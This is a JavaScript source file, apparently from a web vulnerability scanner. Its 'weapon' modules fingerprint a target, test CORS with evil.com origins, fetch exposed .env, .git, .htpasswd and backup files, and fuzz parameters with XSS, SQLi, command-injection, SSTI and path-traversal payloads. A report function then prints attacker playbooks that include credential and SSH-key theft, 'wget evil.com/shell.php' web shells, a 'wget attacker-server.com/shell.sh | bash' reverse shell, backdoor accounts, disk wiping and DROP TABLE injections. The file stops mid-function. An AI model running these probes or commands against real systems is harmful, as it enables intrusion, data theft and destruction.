// Screenshot simulation (DOM analysis)
// ═══════════════════════════════════════

export function analyzePageForScreenshot(url, html, headers) {
    if (!html || typeof html !== 'string') return null;

    try {
        const $ = cheerio.load(html);
        const title = $('title').text().trim() || 'No Title';
        const htmlLower = html.toLowerCase();

        let pageType = 'website';
        const hasLoginForm = !!($('input[type="password"]').length > 0 || htmlLower.includes('login') || htmlLower.includes('sign in'));
        const hasAdminPanel = !!(htmlLower.includes('admin') || htmlLower.includes('dashboard') || htmlLower.includes('control panel'));

        if (hasLoginForm) pageType = 'login';
        else if (hasAdminPanel) pageType = 'admin';
        else if (htmlLower.includes('api') || htmlLower.includes('swagger')) pageType = 'api';
        else if (htmlLower.includes('error') || htmlLower.includes('404')) pageType = 'error';

        let hash = 0;
        for (let i = 0; i < Math.min(url.length + title.length, 100); i++) {
            hash = ((hash << 5) - hash) + (url + title).charCodeAt(i);
            hash |= 0;
        }
        const hue = Math.abs(hash) % 360;
        const screenshotColor = `hsl(${hue}, 30%, 15%)`;

        return {
            url, title, screenshot_color: screenshotColor, page_type: pageType,
            has_login_form: hasLoginForm ? 1 : 0, has_admin_panel: hasAdminPanel ? 1 : 0,
            capture_time: Math.floor(Math.random() * 800) + 200
        };
    } catch (e) { return null; }
}

// ═══════════════════════════════════════
// Utility
// ═══════════════════════════════════════

function getTitle(html) {
    try {
        if (!html || typeof html !== 'string') return 'No Title';
        const $ = cheerio.load(html);
        return $('title').text().trim() || 'No Title';
    } catch (e) { return 'No Title'; }
}

// ═══════════════════════════════════════════════════════════════════
// WEAPON ARSENAL — Advanced Attack Modules
// ═══════════════════════════════════════════════════════════════════

const WEAPON_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';

async function weaponGet(url, opts = {}) {
    try {
        return await axios.get(url, { timeout: opts.timeout || 12000, validateStatus: () => true, maxRedirects: opts.maxRedirects ?? 5, headers: { 'User-Agent': WEAPON_UA, ...opts.headers }, ...opts });
    } catch (e) { return null; }
}

async function weaponPost(url, data, opts = {}) {
    try {
        return await axios.post(url, data, { timeout: opts.timeout || 12000, validateStatus: () => true, maxRedirects: 3, headers: { 'User-Agent': WEAPON_UA, ...opts.headers }, ...opts });
    } catch (e) { return null; }
}

// ═══════════════════════════════════════
// WEAPON: Full Recon + Attack Pipeline
// ═══════════════════════════════════════

export async function weaponFullRecon(targetUrl) {
    const result = {
        target: targetUrl,
        timestamp: new Date().toISOString(),
        serverInfo: {},
        securityPosture: { score: 100, issues: [] },
        dataAtRisk: [],
        attackResults: [],
        leakedData: [],
        endpoints: [],
        totalTests: 0,
        totalHits: 0,
    };

    const UA = WEAPON_UA;

    // ─── PHASE 1: Server Fingerprinting ───
    const mainRes = await weaponGet(targetUrl);
    if (!mainRes) {
        result.serverInfo = { error: 'Target unreachable' };
        return result;
    }

    const headers = mainRes.headers || {};
    const body = typeof mainRes.data === 'string' ? mainRes.data : JSON.stringify(mainRes.data || '');

    result.serverInfo = {
        status: mainRes.status,
        server: headers['server'] || 'Hidden',
        poweredBy: headers['x-powered-by'] || 'Hidden',
        contentType: headers['content-type'] || 'Unknown',
        setCookie: headers['set-cookie'] || null,
        via: headers['via'] || null,
        xFrameOptions: headers['x-frame-options'] || 'MISSING',
        csp: headers['content-security-policy'] || 'MISSING',
        hsts: headers['strict-transport-security'] || 'MISSING',
        cors: headers['access-control-allow-origin'] || 'Not set',
        xContentType: headers['x-content-type-options'] || 'MISSING',
        referrerPolicy: headers['referrer-policy'] || 'MISSING',
        permissionsPolicy: headers['permissions-policy'] || headers['feature-policy'] || 'MISSING',
        allHeaders: Object.fromEntries(Object.entries(headers).filter(([k]) => !['connection','keep-alive','transfer-encoding','date'].includes(k))),
    };

    // ─── PHASE 2: Security Posture Scoring ───
    const secIssues = [];
    if (!headers['strict-transport-security']) { secIssues.push({ issue: 'No HSTS', impact: 'MITM attacks possible', severity: 'high', deduction: 10 }); }
    if (!headers['content-security-policy']) { secIssues.push({ issue: 'No CSP', impact: 'XSS attacks easier', severity: 'high', deduction: 10 }); }
    if (!headers['x-frame-options'] && !(headers['content-security-policy'] || '').includes('frame-ancestors')) { secIssues.push({ issue: 'No clickjacking protection', impact: 'Clickjacking possible', severity: 'medium', deduction: 5 }); }
    if (!headers['x-content-type-options']) { secIssues.push({ issue: 'No MIME sniffing protection', impact: 'MIME-based attacks', severity: 'low', deduction: 3 }); }
    if (headers['server'] && headers['server'] !== 'cloudflare') { secIssues.push({ issue: `Server banner exposed: ${headers['server']}`, impact: 'Version-specific exploits', severity: 'low', deduction: 3 }); }
    if (headers['x-powered-by']) { secIssues.push({ issue: `Tech stack exposed: ${headers['x-powered-by']}`, impact: 'Targeted attacks', severity: 'low', deduction: 3 }); }
    if (headers['access-control-allow-origin'] === '*') { secIssues.push({ issue: 'CORS wildcard', impact: 'Cross-origin data theft', severity: 'high', deduction: 15 }); }
    if (headers['set-cookie']) {
        const cookies = Array.isArray(headers['set-cookie']) ? headers['set-cookie'] : [headers['set-cookie']];
        cookies.forEach(c => {
            const cl = c.toLowerCase();
            if (!cl.includes('httponly')) secIssues.push({ issue: `Cookie ${c.split('=')[0]} missing HttpOnly`, impact: 'XSS can steal cookies', severity: 'high', deduction: 8 });
            if (!cl.includes('secure')) secIssues.push({ issue: `Cookie ${c.split('=')[0]} missing Secure`, impact: 'Cookie sent over HTTP', severity: 'medium', deduction: 5 });
            if (!cl.includes('samesite')) secIssues.push({ issue: `Cookie ${c.split('=')[0]} missing SameSite`, impact: 'CSRF possible', severity: 'medium', deduction: 4 });
        });
    }
    let score = 100;
    secIssues.forEach(i => { score -= i.deduction; });
    result.securityPosture = { score: Math.max(0, score), issues: secIssues, grade: score >= 90 ? 'A' : score >= 75 ? 'B' : score >= 50 ? 'C' : score >= 25 ? 'D' : 'F' };

    // ─── PHASE 3: CORS Deep Test ───
    const corsOrigins = ['https://evil.com', 'null', `https://${new URL(targetUrl).hostname}.evil.com`, 'https://attacker.example.com'];
    for (const origin of corsOrigins) {
        result.totalTests++;
        const corsRes = await weaponGet(targetUrl, { headers: { 'Origin': origin } });
        if (corsRes) {
            const acao = corsRes.headers['access-control-allow-origin'];
            const acac = corsRes.headers['access-control-allow-credentials'];
            if (acao === '*' || acao === origin) {
                result.totalHits++;
                result.attackResults.push({
                    attack: 'CORS Misconfiguration',
                    severity: acac === 'true' ? 'critical' : 'high',
                    success: true,
                    payload: `Origin: ${origin}`,
                    evidence: `ACAO=${acao}, ACAC=${acac || 'not set'}`,
                    impact: acac === 'true' ? 'Authenticated cross-origin data theft possible' : 'Cross-origin responses readable',
                    dataAtRisk: 'User sessions, API responses, personal data',
                });
                break;
            }
        }
    }

    // ─── PHASE 4: Header Injection Test ───
    result.totalTests++;
    const hijRes = await weaponGet(`${targetUrl}?x=%0d%0aX-Injected:%20BUGFINDER`, { maxRedirects: 0 });
    if (hijRes && hijRes.headers['x-injected']) {
        result.totalHits++;
        result.attackResults.push({ attack: 'HTTP Header Injection', severity: 'high', success: true, payload: 'CRLF injection via query param', evidence: 'Custom header injected into response', impact: 'Cache poisoning, session fixation, XSS via headers', dataAtRisk: 'All users via cache poisoning' });
    }

    // ─── PHASE 5: Sensitive Data Discovery ───
    const sensitiveChecks = [
        { path: '/.env', name: '.env File', critical: true, check: d => d.includes('=') && (d.includes('DB_') || d.includes('SECRET') || d.includes('KEY') || d.includes('PASSWORD')) },
        { path: '/.git/HEAD', name: 'Git Repository', critical: true, check: d => d.includes('ref:') || /^[0-9a-f]{40}$/.test(d.trim()) },
        { path: '/.git/config', name: 'Git Config', critical: true, check: d => d.includes('[core]') || d.includes('[remote') },
        { path: '/phpinfo.php', name: 'PHP Info', critical: false, check: d => d.includes('phpinfo') || d.includes('PHP Version') },
        { path: '/server-status', name: 'Apache Status', critical: false, check: d => d.includes('Apache Server Status') || d.includes('Server Version') },
        { path: '/actuator/env', name: 'Spring Boot Env', critical: true, check: d => d.includes('propertySources') || d.includes('activeProfiles') },
        { path: '/wp-config.php.bak', name: 'WordPress Config Backup', critical: true, check: d => d.includes('DB_NAME') || d.includes('DB_PASSWORD') },
        { path: '/backup.sql', name: 'SQL Backup', critical: true, check: d => d.includes('CREATE TABLE') || d.includes('INSERT INTO') },
        { path: '/debug', name: 'Debug Endpoint', critical: false, check: d => d.length > 50 && !d.includes('404') },
        { path: '/api/swagger.json', name: 'Swagger API Spec', critical: false, check: d => d.includes('swagger') || d.includes('openapi') },
        { path: '/graphql', name: 'GraphQL Endpoint', critical: false, check: d => d.length > 10 && !d.includes('Cannot GET') },
        { path: '/wp-json/wp/v2/users', name: 'WordPress Users', critical: false, check: d => d.includes('"slug"') || d.includes('"name"') },
        { path: '/.htpasswd', name: 'Password File', critical: true, check: d => d.includes(':$') || d.includes(':{SHA}') },
        { path: '/docker-compose.yml', name: 'Docker Compose', critical: true, check: d => d.includes('services:') || d.includes('version:') },
        { path: '/config.json', name: 'Config File', critical: false, check: d => { try { JSON.parse(d); return true; } catch { return false; } } },
    ];

    for (let i = 0; i < sensitiveChecks.length; i += 5) {
        const batch = sensitiveChecks.slice(i, i + 5);
        await Promise.allSettled(batch.map(async (sc) => {
            result.totalTests++;
            const url = targetUrl.replace(/\/$/, '') + sc.path;
            const r = await weaponGet(url, { timeout: 8000 });
            if (r && r.status === 200) {
                const data = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
                if (sc.check(data)) {
                    result.totalHits++;
                    result.leakedData.push({
                        source: sc.name,
                        path: sc.path,
                        url,
                        critical: sc.critical,
                        size: data.length,
                        preview: data.substring(0, 500),
                    });
                }
            }
        }));
    }

    // ─── PHASE 6: GraphQL Introspection ───
    const gqlEndpoints = ['/graphql', '/api/graphql', '/v1/graphql'];
    for (const ep of gqlEndpoints) {
        result.totalTests++;
        const gqlRes = await weaponPost(targetUrl.replace(/\/$/, '') + ep, JSON.stringify({ query: '{ __schema { types { name fields { name } } } }' }), {
            headers: { 'Content-Type': 'application/json' },
        });
        if (gqlRes && gqlRes.status === 200) {
            const gqlBody = typeof gqlRes.data === 'string' ? gqlRes.data : JSON.stringify(gqlRes.data || '');
            if (gqlBody.includes('__schema') || gqlBody.includes('types')) {
                result.totalHits++;
                result.attackResults.push({
                    attack: 'GraphQL Introspection',
                    severity: 'high',
                    success: true,
                    payload: '{ __schema { types { name fields { name } } } }',
                    evidence: `GraphQL schema exposed at ${ep}. Full API structure visible.`,
                    impact: 'Complete API schema revealed — all queries, mutations, types, fields visible',
                    dataAtRisk: 'Entire API surface, all data models, authentication structure',
                    data: gqlBody.substring(0, 2000),
                });
                break;
            }
        }
    }

    // ─── PHASE 7: Parameter Fuzzing ───
    const fuzzParams = ['id', 'user', 'admin', 'debug', 'test', 'token', 'key', 'secret', 'config', 'file', 'path', 'url', 'redirect', 'callback', 'ref', 'page', 'action', 'type', 'format', 'lang', 'search', 'q', 'cmd', 'exec', 'domain'];
    const fuzzPayloads = [
        { payload: '<script>alert(1)</script>', type: 'XSS', check: (b) => b.includes('<script>alert(1)</script>') },
        { payload: "' OR 1=1--", type: 'SQLi', check: (b) => { const l = b.toLowerCase(); return ['sql syntax', 'mysql', 'sqlstate', 'unclosed quotation', 'pg::syntaxerror'].some(e => l.includes(e)); } },
        { payload: ';echo BF_FUZZ_HIT', type: 'RCE', check: (b) => b.includes('BF_FUZZ_HIT') },
        { payload: '{{7*7}}', type: 'SSTI', check: (b) => b.includes('49') && !b.includes('{{7*7}}') },
        { payload: '../../../etc/passwd', type: 'LFI', check: (b) => b.includes('root:') || b.includes('/bin/bash') },
    ];

    for (const fp of fuzzPayloads) {
        for (const param of fuzzParams.slice(0, 12)) {
            result.totalTests++;
            const sep = targetUrl.includes('?') ? '&' : '?';
            const testUrl = `${targetUrl}${sep}${param}=${encodeURIComponent(fp.payload)}`;
            const r = await weaponGet(testUrl, { timeout: 8000 });
            if (r) {
                const rBody = typeof r.data === 'string' ? r.data : '';
                if (fp.check(rBody)) {
                    result.totalHits++;
                    result.attackResults.push({
                        attack: fp.type,
                        severity: 'critical',
                        success: true,
                        payload: `${param}=${fp.payload}`,
                        evidence: `${fp.type} confirmed via parameter "${param}"`,
                        impact: fp.type === 'RCE' ? 'Full server compromise' : fp.type === 'SQLi' ? 'Database access' : fp.type === 'LFI' ? 'Server file access' : fp.type === 'SSTI' ? 'Remote code execution via templates' : 'Client-side code execution',
                        dataAtRisk: fp.type === 'RCE' ? 'Everything — full control' : fp.type === 'SQLi' ? 'All database records' : 'Varies by context',
                        url: testUrl,
                        responsePreview: rBody.substring(0, 500),
                    });
                    break;
                }
            }
        }
    }

    // ─── PHASE 8: Data at Risk Assessment ───
    const risks = [];
    const cookies = headers['set-cookie'];
    if (cookies) {
        const cookieArr = Array.isArray(cookies) ? cookies : [cookies];
        risks.push({ category: 'Session Cookies', count: cookieArr.length, detail: cookieArr.map(c => c.split(';')[0]).join(', '), severity: 'high', impact: 'Account takeover if stolen via XSS' });
    }
    if (result.leakedData.length > 0) {
        const critLeaks = result.leakedData.filter(l => l.critical);
        if (critLeaks.length > 0) risks.push({ category: 'Critical Config Files', count: critLeaks.length, detail: critLeaks.map(l => l.source).join(', '), severity: 'critical', impact: 'Database credentials, API keys, secrets exposed' });
        const infoLeaks = result.leakedData.filter(l => !l.critical);
        if (infoLeaks.length > 0) risks.push({ category: 'Information Leakage', count: infoLeaks.length, detail: infoLeaks.map(l => l.source).join(', '), severity: 'medium', impact: 'Server internals, debug info, API documentation exposed' });
    }
    const vulnAttacks = result.attackResults.filter(a => a.success);
    if (vulnAttacks.some(a => a.attack === 'RCE' || a.attack === 'SSTI')) risks.push({ category: 'Remote Code Execution', count: 1, detail: 'Server commands executable', severity: 'critical', impact: 'Full server compromise — all data, all users, all services' });
    if (vulnAttacks.some(a => a.attack === 'SQLi')) risks.push({ category: 'Database Compromise', count: 1, detail: 'SQL queries injectable', severity: 'critical', impact: 'All database tables — users, passwords, emails, payment data' });
    if (vulnAttacks.some(a => a.attack === 'LFI')) risks.push({ category: 'Server Files', count: 1, detail: 'Local files readable', severity: 'critical', impact: 'Config files, source code, /etc/passwd, logs, keys' });
    if (vulnAttacks.some(a => a.attack === 'XSS')) risks.push({ category: 'Client-Side Attack', count: 1, detail: 'Script injection possible', severity: 'high', impact: 'Cookie theft, session hijacking, phishing, keylogging' });
    if (vulnAttacks.some(a => a.attack === 'CORS Misconfiguration')) risks.push({ category: 'Cross-Origin Data', count: 1, detail: 'CORS misconfigured', severity: 'high', impact: 'Any website can read authenticated API responses' });
    if (secIssues.length >= 4) risks.push({ category: 'Weak Security Posture', count: secIssues.length, detail: `${secIssues.length} security headers missing`, severity: 'medium', impact: 'Multiple attack vectors enabled by poor configuration' });

    result.dataAtRisk = risks;

    return result;
}

// ═══════════════════════════════════════
// WEAPON: Data Risk Report
// ═══════════════════════════════════════

export function buildPostExploitImpact(wr) {
    const lines = [];
    const attacks = wr.attackResults.filter(a => a.success);
    const hasRCE = attacks.some(a => a.attack === 'RCE');
    const hasSSTI = attacks.some(a => a.attack === 'SSTI');
    const hasSQLi = attacks.some(a => a.attack === 'SQLi');
    const hasLFI = attacks.some(a => a.attack === 'LFI');
    const hasXSS = attacks.some(a => a.attack === 'XSS');
    const hasCORS = attacks.some(a => a.attack === 'CORS Misconfiguration');
    const hasGQL = attacks.some(a => a.attack === 'GraphQL Introspection');
    const leaks = wr.leakedData || [];
    const server = wr.serverInfo || {};
    const cookies = server.setCookie ? (Array.isArray(server.setCookie) ? server.setCookie : [server.setCookie]) : [];

    if (!hasRCE && !hasSSTI && !hasSQLi && !hasLFI && !hasXSS && !hasCORS && !hasGQL && leaks.length === 0) {
        lines.push('');
        lines.push('  ✅ No exploitable vulnerabilities confirmed — impact analysis not applicable.');
        return lines;
    }

    // ───────── COMPROMISE LEVEL ─────────
    let compromiseLevel = 'LOW';
    let compromisePct = 10;
    if (hasRCE || hasSSTI) { compromiseLevel = 'TOTAL'; compromisePct = 100; }
    else if (hasSQLi) { compromiseLevel = 'CRITICAL'; compromisePct = 85; }
    else if (hasLFI) { compromiseLevel = 'HIGH'; compromisePct = 65; }
    else if (hasXSS && (hasCORS || cookies.length)) { compromiseLevel = 'HIGH'; compromisePct = 55; }
    else if (hasXSS || hasCORS) { compromiseLevel = 'MODERATE'; compromisePct = 35; }
    else if (leaks.length > 0) { compromiseLevel = 'MODERATE'; compromisePct = 30; }

    lines.push('');
    lines.push('╔═══════════════════════════════════════════════════════════════════╗');
    lines.push('║           ☠️  POST-EXPLOITATION IMPACT ANALYSIS  ☠️              ║');
    lines.push('╚═══════════════════════════════════════════════════════════════════╝');
    lines.push('');

    // ───────── SERVER COMPROMISE METER ─────────
    const barLen = 30;
    const filled = Math.round(barLen * compromisePct / 100);
    const bar = '█'.repeat(filled) + '░'.repeat(barLen - filled);
    lines.push(`  SERVER COMPROMISE: [${bar}] ${compromisePct}%`);
    lines.push(`  LEVEL: ${compromiseLevel === 'TOTAL' ? '🔴🔴🔴 TOTAL COMPROMISE' : compromiseLevel === 'CRITICAL' ? '🔴🔴 CRITICAL COMPROMISE' : compromiseLevel === 'HIGH' ? '🔴 HIGH COMPROMISE' : compromiseLevel === 'MODERATE' ? '🟠 MODERATE COMPROMISE' : '🟡 LOW RISK'}`);
    lines.push('');

    // ───────── RCE / SSTI: FULL SERVER CONTROL ─────────
    if (hasRCE || hasSSTI) {
        const rceAttack = attacks.find(a => a.attack === 'RCE') || attacks.find(a => a.attack === 'SSTI');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🔴 FULL SERVER CONTROL ACHIEVED');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push(`  Attack Vector: ${rceAttack.attack} via ${rceAttack.payload}`);
        lines.push('');
        lines.push('  ┌─────────────────────────────────────────────────────────┐');
        lines.push('  │  WHAT THE ATTACKER CAN EXECUTE:                         │');
        lines.push('  └─────────────────────────────────────────────────────────┘');
        lines.push('');
        lines.push('  🖥️  SYSTEM COMMANDS (attacker has shell access):');
        lines.push('    $ whoami                    → Get current user/privilege level');
        lines.push('    $ id                        → Show user ID, groups, permissions');
        lines.push('    $ uname -a                  → Full OS version, kernel info');
        lines.push('    $ cat /etc/passwd           → All user accounts on the system');
        lines.push('    $ cat /etc/shadow           → Password hashes (if root)');
        lines.push('    $ ps aux                    → All running processes');
        lines.push('    $ netstat -tlnp             → All open ports + services');
        lines.push('    $ env                       → All environment variables (DB creds, API keys)');
        lines.push('    $ ls -la /                  → Full filesystem listing');
        lines.push('    $ df -h                     → Disk usage, mounted volumes');
        lines.push('');
        lines.push('  📂 FILE SYSTEM ACCESS (read/write/delete ANY file):');
        lines.push('    $ cat /etc/nginx/nginx.conf → Webserver configuration');
        lines.push('    $ cat /var/www/.env         → Application secrets, DB passwords');
        lines.push('    $ cat ~/.ssh/id_rsa         → SSH private keys');
        lines.push('    $ cat ~/.bash_history       → Command history');
        lines.push('    $ find / -name "*.sql"      → Locate database dumps');
        lines.push('    $ find / -name "*.key"      → Locate SSL/signing keys');
        lines.push('    $ tar czf /tmp/exfil.tar.gz /var/www → Package entire site for download');
        lines.push('    $ rm -rf /var/www/*          → DELETE entire website');
        lines.push('');
        lines.push('  🗄️  DATABASE ACCESS (steal everything):');
        lines.push('    $ mysql -u root -p < dump.sql  → Dump MySQL databases');
        lines.push('    $ pg_dumpall                    → Dump PostgreSQL databases');
        lines.push('    $ sqlite3 *.db .dump            → Dump SQLite databases');
        lines.push('    $ mongodump                     → Dump MongoDB');
        lines.push('    → Contains: user accounts, emails, passwords, payment data,');
        lines.push('      personal info, API keys, session tokens, EVERYTHING');
        lines.push('');
        lines.push('  🌐 NETWORK CONTROL (pivot to other systems):');
        lines.push('    $ curl http://internal-api:8080  → Access internal services');
        lines.push('    $ nmap 10.0.0.0/24              → Scan internal network');
        lines.push('    $ ssh admin@10.0.0.5             → Pivot to other machines');
        lines.push('    $ iptables -F                    → Disable firewall');
        lines.push('    → Attack other servers, internal APIs, microservices');
        lines.push('');
        lines.push('  🚪 PERSISTENCE (stay in forever):');
        lines.push('    $ crontab -e                     → Schedule backdoor to auto-run');
        lines.push('    $ echo "ssh-key" >> ~/.ssh/authorized_keys → Add SSH access');
        lines.push('    $ useradd backdoor -m -s /bin/bash → Create hidden admin user');
        lines.push('    $ wget evil.com/shell.php -O /var/www/sh.php → Web shell');
        lines.push('    → Attacker survives reboots, updates, password changes');
        lines.push('');
        lines.push('  💀 DESTRUCTION CAPABILITY:');
        lines.push('    $ rm -rf /                       → Wipe entire server');
        lines.push('    $ dd if=/dev/zero of=/dev/sda    → Destroy disk');
        lines.push('    $ echo "hacked" > index.html     → Deface website');
        lines.push('    → RANSOMWARE: encrypt all files, demand payment');
        lines.push('    → WIPER: destroy everything, no recovery possible');
        lines.push('');

        // Actual payload proof
        lines.push('  ┌─────────────────────────────────────────────────────────┐');
        lines.push('  │  PROOF OF CONCEPT — LIVE EXPLOITATION PATH:             │');
        lines.push('  └─────────────────────────────────────────────────────────┘');
        lines.push(`  1. Send: GET ${wr.target}?${rceAttack.payload.replace('=', '=<COMMAND>')}`);
        lines.push(`  2. Server executes <COMMAND> as the web process user`);
        lines.push(`  3. Replace <COMMAND> with: id; cat /etc/passwd; env`);
        lines.push(`  4. Response contains command output`);
        lines.push(`  5. Chain: wget attacker-server.com/shell.sh | bash`);
        lines.push(`  6. Result: Persistent reverse shell → FULL CONTROL`);
        lines.push('');
    }

    // ───────── SQL INJECTION: DATABASE CONTROL ─────────
    if (hasSQLi) {
        const sqliAttack = attacks.find(a => a.attack === 'SQLi');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🔴 DATABASE FULLY COMPROMISED');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push(`  Attack Vector: SQLi via ${sqliAttack.payload}`);
        lines.push('');
        lines.push('  🗄️  WHAT THE ATTACKER CAN STEAL FROM YOUR DATABASE:');
        lines.push('');
        lines.push('    TABLE: users');
        lines.push('    ┌────────┬──────────────────┬────────────────────────┬──────────────┐');
        lines.push('    │  id    │ email            │ password_hash          │ role         │');
        lines.push('    ├────────┼──────────────────┼────────────────────────┼──────────────┤');
        lines.push('    │  1     │ admin@site.com   │ $2b$10$Kx8f...        │ admin        │');
        lines.push('    │  2     │ user@email.com   │ $2b$10$Qm3p...        │ user         │');
        lines.push('    │  ...   │ ALL ROWS         │ ALL HASHES             │ ALL ROLES    │');
        lines.push('    └────────┴──────────────────┴────────────────────────┴──────────────┘');
        lines.push('');
        lines.push('  📋 ATTACKER SQL COMMANDS:');
        lines.push("    ' UNION SELECT username,password FROM users--");
        lines.push("    ' UNION SELECT table_name,null FROM information_schema.tables--");
        lines.push("    ' UNION SELECT column_name,data_type FROM information_schema.columns--");
        lines.push("    '; DROP TABLE users;--             → DELETE user table");
        lines.push("    '; UPDATE users SET role='admin'-- → Elevate privileges");
        lines.push("    '; INSERT INTO users VALUES(...)-- → Create admin account");
        lines.push('');
        lines.push('  📊 DATA THE ATTACKER DUMPS:');
        lines.push('    → User accounts (emails, usernames, password hashes)');
        lines.push('    → Payment info (credit cards, billing addresses)');
        lines.push('    → Personal data (names, phones, addresses, SSNs)');
        lines.push('    → Admin credentials (full site takeover)');
        lines.push('    → API keys & secrets stored in DB');
        lines.push('    → Session tokens (impersonate any user)');
        lines.push('');
        lines.push('  💀 IMPACT:');
        lines.push('    → Attacker can READ every record in every table');
        lines.push('    → Attacker can MODIFY data (change passwords, roles)');
        lines.push('    → Attacker can DELETE entire database');
        lines.push('    → If DB user has FILE privilege: read server files too');
        lines.push('');
    }

    // ───────── LFI: FILE SYSTEM ACCESS ─────────
    if (hasLFI) {
        const lfiAttack = attacks.find(a => a.attack === 'LFI');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🔴 SERVER FILE SYSTEM EXPOSED');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push(`  Attack Vector: LFI via ${lfiAttack.payload}`);
        lines.push('');
        lines.push('  📂 FILES THE ATTACKER CAN READ:');
        lines.push('    /etc/passwd          → All user accounts');
        lines.push('    /etc/shadow          → Password hashes (if web user = root)');
        lines.push('    /etc/hosts           → Internal hostname map');
        lines.push('    /proc/self/environ   → Environment variables (DB passwords!)');
        lines.push('    /var/www/.env        → Application secrets');
        lines.push('    /var/log/auth.log    → Login attempts, SSH keys used');
        lines.push('    ~/.ssh/id_rsa        → SSH private keys → access other servers');
        lines.push('    /etc/nginx/nginx.conf→ Server config, internal endpoints');
        lines.push('    /var/www/config.php  → Database credentials');
        lines.push('');
        lines.push('  🔓 ESCALATION PATH:');
        lines.push('    LFI → Read .env → Get DB creds → Dump database');
        lines.push('    LFI → Read SSH keys → SSH to other servers');
        lines.push('    LFI → Read /proc/self/environ → Steal all secrets');
        lines.push('    LFI + log poisoning → Remote Code Execution');
        lines.push('');
    }

    // ───────── XSS + COOKIES: USER ACCOUNT TAKEOVER ─────────
    if (hasXSS) {
        const xssAttack = attacks.find(a => a.attack === 'XSS');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🟠 CLIENT-SIDE ATTACK → ACCOUNT TAKEOVER');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push(`  Attack Vector: XSS via ${xssAttack.payload}`);
        lines.push('');
        lines.push('  🎭 WHAT THE ATTACKER CAN DO TO EVERY VISITOR:');
        lines.push('');
        lines.push('    1. STEAL SESSION COOKIES:');
        if (cookies.length > 0) {
            cookies.forEach(c => {
                const name = c.split('=')[0].trim();
                const hasHttpOnly = c.toLowerCase().includes('httponly');
                lines.push(`       Cookie "${name}" ${hasHttpOnly ? '🔒 HttpOnly (protected)' : '🔴 STEALABLE via document.cookie'}`);
            });
        }
        lines.push('       → Send cookies to attacker server → Login as victim');
        lines.push('');
        lines.push('    2. KEYLOG CREDENTIALS:');
        lines.push('       → Inject keylogger on login page');
        lines.push('       → Capture username + password as user types');
        lines.push('       → Send to attacker in real-time');
        lines.push('');
        lines.push('    3. PHISHING OVERLAY:');
        lines.push('       → Replace page content with fake login form');
        lines.push('       → Victim thinks they\'re on real site');
        lines.push('       → Credentials sent to attacker');
        lines.push('');
        lines.push('    4. CRYPTO / MALWARE:');
        lines.push('       → Inject crypto miner in browser');
        lines.push('       → Redirect to malware download');
        lines.push('       → Drive-by download attacks');
        lines.push('');
        if (hasCORS) {
            lines.push('    5. 🔴 XSS + CORS = FULL API ACCESS:');
            lines.push('       → XSS steals cookies, CORS allows cross-origin reads');
            lines.push('       → Attacker can call ANY API endpoint as the victim');
            lines.push('       → Change password, transfer funds, delete account');
            lines.push('');
        }
    }

    // ───────── CORS: CROSS-ORIGIN DATA THEFT ─────────
    if (hasCORS && !hasXSS) {
        const corsAttack = attacks.find(a => a.attack === 'CORS Misconfiguration');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🟠 CROSS-ORIGIN DATA THEFT POSSIBLE');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push(`  CORS allows: ${corsAttack.payload}`);
        lines.push('');
        lines.push('  Any website can read API responses from logged-in users:');
        lines.push('    → User visits attacker\'s site while logged into yours');
        lines.push('    → Attacker\'s JavaScript fetches your API');
        lines.push('    → Gets: user profiles, messages, billing, private data');
        lines.push('    → All done silently without user knowledge');
        lines.push('');
    }

    // ───────── GRAPHQL ─────────
    if (hasGQL) {
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🟠 FULL API SCHEMA EXPOSED VIA GRAPHQL');
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  Attacker can see:');
        lines.push('    → Every query, mutation, subscription');
        lines.push('    → All data types and their fields');
        lines.push('    → Authentication/authorization structure');
        lines.push('    → Hidden admin mutations');
        lines.push('    → Bulk data extraction via nested queries');
        lines.push('');
    }

    // ───────── LEAKED FILES DETAIL ─────────
    if (leaks.length > 0) {
        lines.push('═══════════════════════════════════════════════════════════════════');
        lines.push('  🔓 EXPOSED FILES — ACTUAL DATA PREVIEW');
        lines.push('═══════════════════════════════════════════════════════════════════');
        leaks.forEach(l => {
            lines.push(`  📄 ${l.source} (${l.url})`);
            lines.push(`     Size: ${l.size} bytes | Critical: ${l.critical ? 'YES' : 'No'}`);
            // Show actual content preview
            const previewLines = l.preview.split('\n').slice(0, 15);
            lines.push('     ┌── Content ──');
            previewLines.forEach(pl => lines.push(`     │ ${pl}`));
            if (l.preview.split('\n').length > 15) lines.push('     │ ... (truncated)');
            lines.push('     └──────────');
            if (l.critical) {
                if (l.source.includes('.env')) lines.push('     🔴 Contains: database passwords, API keys, secret tokens');
                if (l.source.includes('.git')) lines.push('     🔴 Contains: full source code history, commits, branches');
                if (l.source.includes('backup.sql')) lines.push('     🔴 Contains: full database dump — ALL user data');
                if (l.source.includes('docker')) lines.push('     🔴 Contains: infrastructure secrets, service topology');
                if (l.source.includes('htpasswd')) lines.push('     🔴 Contains: admin password hashes');
                if (l.source.includes('wp-config')) lines.push('     🔴 Contains: WordPress DB credentials, auth keys');
            }
            lines.push('');
        });
    }

    // ───────── OVERALL IMPACT SUMMARY ─────────
    lines.push('');
    lines.push('╔═══════════════════════════════════════════════════════════════════╗');
    lines.push('║                   OVERALL IMPACT SUMMARY                         ║');
    lines.push('╚═══════════════════════════════════════════════════════════════════╝');
    lines.push('');
    const capabilities = [];
    if (hasRCE || hasSSTI) capabilities.push({ icon: '🔴', cap: 'Execute any command on the server', status: 'CONFIRMED' });
    if (hasRCE || hasSSTI) capabilities.push({ icon: '🔴', cap: 'Read/write/delete any file', status: 'CONFIRMED' });
    if (hasRCE || hasSSTI) capabilities.push({ icon: '🔴', cap: 'Access all databases', status: 'CONFIRMED' });
